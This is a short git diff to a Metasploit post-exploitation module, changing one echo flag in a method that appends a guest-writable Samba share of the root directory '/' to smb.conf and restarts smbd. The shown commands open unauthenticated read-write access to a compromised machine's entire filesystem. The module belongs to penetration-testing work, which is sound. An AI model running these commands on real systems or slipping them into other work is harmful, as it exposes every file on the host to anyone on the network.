@@ -41,7 +41,7 @@ class MetasploitModule < Msf::Post
   def copy_smb_conf(dir)
     cmd_exec_delay("rm -f #{dir}smb.conf")
     cmd_exec_delay("cp -f /var/samba/smb.conf #{dir}smb.conf")
-    cmd_exec_delay("echo -e '[rootdir]\ncomment = rootdir\npath = /\nbrowseable = yes\nwriteable = yes\nguest ok = yes\n' >> #{dir}smb.conf")
+    cmd_exec_delay("echo '[rootdir]\ncomment = rootdir\npath = /\nbrowseable = yes\nwriteable = yes\nguest ok = yes\n' >> #{dir}smb.conf")
     cmd_exec_delay('killall smbd')
     cmd_exec_delay("smbd -D -s #{dir}smb.conf")
     cmd_exec_delay("smbd -D -s=#{dir}smb.conf") # Uses equal just in case
